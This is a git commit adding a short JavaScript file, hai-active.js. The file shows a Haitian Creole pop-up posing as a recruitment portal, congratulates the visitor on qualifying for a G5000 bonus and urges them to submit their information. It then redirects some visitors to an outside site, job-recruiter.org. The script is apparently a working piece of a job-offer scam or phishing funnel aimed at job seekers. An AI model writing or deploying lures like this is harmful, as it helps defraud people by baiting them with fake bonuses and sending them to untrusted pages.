656290061c240d1a65488074ef2db60b1df09f34
mas-gift <harisuhamza310@gmail.com>
2026-01-09 20:55:37 +0100

    Create hai-active.js

---
+++ hai-active.js
@@ -0,0 +1,5 @@
+var password = 'Soumèt Kounye a'
+password=prompt('Portal Rekritman: Felisitasyon, ou kalifye pou Aplike & jwenn Bonis G5000, Tanpri peze OK pou soumèt enfòmasyon ou kounye a.','Soumèt Kounye a');
+if (password != 'Soumèt Kounye a') {
+location.href='https://job-recruiter.org/potal-travay.html';
+}
